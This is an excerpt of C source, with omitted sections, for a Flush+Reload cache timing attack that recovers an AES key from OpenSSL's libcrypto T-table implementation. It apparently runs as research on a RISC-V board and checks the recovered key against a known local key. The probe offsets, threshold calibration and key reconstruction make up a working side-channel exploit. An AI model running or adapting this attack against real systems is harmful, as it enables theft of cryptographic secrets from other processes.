...
//#define MIN_CACHE_MISS_CYCLES (3550)
...
int main()
{
  long long MIN_CACHE_MISS_CYCLES = 3550;
  ...
  int fd = open("/home/beagle/Documents/RISC_V_Gaetan/nepoche_flush_reload_aes/openssl-install/lib/libcrypto.so", O_RDONLY);
  if (fd < 0) {
    perror("open failed");
    exit(-1);
  }  
  ...
  read(perf_timer, &min_time, sizeof(min_time));
  //uint64_t min_time = rdcycle();
  srand(min_time);
  sum = 0;
  char* probe[] = { 
    base + 0x13de48, base + 0x13da48, base + 0x13e248, base + 0x13e648
  };

  //printf("base = %p, end = %p, size = %zu\n", base, end, size);
  //printf("probe[0] = %p\n", probe[0]);
  //printf("probe[1] = %p\n", probe[1]);
  //printf("probe[2] = %p\n", probe[2]);
  //printf("probe[3] = %p\n", probe[3]);

  printf("=== Timing calibration ===\n");
  maccess(probe[0]); // warm it up
  fence();
  long long t1 = 0, hot = 0, t2 = 0, cold = 0;
  for (int t = 0; t < 10; t++) {
      // measure HOT access (should be small)
      //size_t t1 = rdcycle();
      read(perf_timer, &t1, sizeof(t1));
      maccess(probe[0]);
      fence();
      //size_t hot = rdcycle() - t1;
      read(perf_timer, &hot, sizeof(hot));
      hot -= t1;

      // flush then measure COLD access (should be large)
      flush(probe[0]);
      fence(); // ensure flush completes
      //size_t t2 = rdcycle();
      read(perf_timer, &t2, sizeof(t2));
      maccess(probe[0]);
      fence();
      //size_t cold = rdcycle() - t2;
      read(perf_timer, &cold, sizeof(cold));
      cold -= t2;

      printf("hot=%llu cold=%llu\n", hot, cold);
  }
  printf("[+] Old MIN_CACHE_MISS_CYCLES: %llu\n", MIN_CACHE_MISS_CYCLES);
  MIN_CACHE_MISS_CYCLES = hot + (cold-hot)/2;
  printf("[+] Updated MIN_CACHE_MISS_CYCLES: %llu\n", MIN_CACHE_MISS_CYCLES);

  long long time = 0, delta = 0;
  // encryptions for Te0
  for (int i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
  {
    ...
    //size_t time = rdcycle();
    read(perf_timer, &time, sizeof(time));
    maccess(probe[0]);
    fence();
    //size_t delta = rdcycle() - time;
    read(perf_timer, &delta, sizeof(delta));
    delta -= time;
  ...
  for (int i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
  {
    ...
    /*if (ciphertext[0] == 0) {
	printf("Delta for 0x00: %ld\n", delta);
    } else if (ciphertext[0] == 200) {
	printf("Delta for 0x0%d: %ld\n", ciphertext[0], delta);
    }*/
    if (delta > MIN_CACHE_MISS_CYCLES) {
  ...
  // After all encryptions, before missRate calculation
  // Check if ANY cache misses were detected at all
  int totalMisses = 0;
  int totalObs = 0;
  for (int i = 0; i < 16; i++)
      for (int j = 0; j < 256; j++) {
          totalMisses += cacheMisses[i][j];
          totalObs += totalEncs[i][j];
      }
  printf("Total observations: %d\n", totalObs);
  printf("Total cache misses detected: %d\n", totalMisses);
  printf("Overall miss rate: %.4f\n", (double)totalMisses / totalObs);

  // Print missRate distribution for byte 0 to see if there's any signal
  printf("missRate[0] sample (first 16 values):\n");
  /*for (int j = 0; j < 256; j++)
      printf("  ctext[0]=0x%02x : misses=%d / total=%d = %.4f\n",
             j, cacheMisses[0][j], totalEncs[0][j], missRate[0][j]);
  */
  ...
  tempWord4 = roundWords[2];
  roundWords[2] = roundWords[1];
  roundWords[1] = tempWord4;
  tempWord4 = roundWords[3];
  roundWords[3] = roundWords[0];
  roundWords[0] = tempWord4;
 
  printf("\n");
  print_hex("Original key", key, 16);

  unsigned char *key_found = (unsigned char*)malloc(16);
  
  for (int i = 3; i >= 0; i--) {
      key_found[4*(3-i)+0] = (roundWords[i] >> 24) & 0xff;
      key_found[4*(3-i)+1] = (roundWords[i] >> 16) & 0xff;
      key_found[4*(3-i)+2] = (roundWords[i] >>  8) & 0xff;
      key_found[4*(3-i)+3] = (roundWords[i]      ) & 0xff;
  }

  print_hex("Recovered key", key_found, 16);

  unsigned char plaintext_test[16] = {0};
  unsigned char ciphertext_test[16], plaintext_found[16];

  print_hex("Plaintext", plaintext_test, 16);
  AES_encrypt(plaintext_test, ciphertext_test, &key_struct);
  print_hex("Ciphertext", ciphertext_test, 16);

  AES_KEY decrypt_key_struct;
  AES_set_decrypt_key(key_found, 128, &decrypt_key_struct); 
  AES_decrypt(ciphertext_test, plaintext_found, &decrypt_key_struct);
  print_hex("Decrypted", plaintext_found, 16);

  if (memcmp(plaintext_test, plaintext_found, 16) == 0)
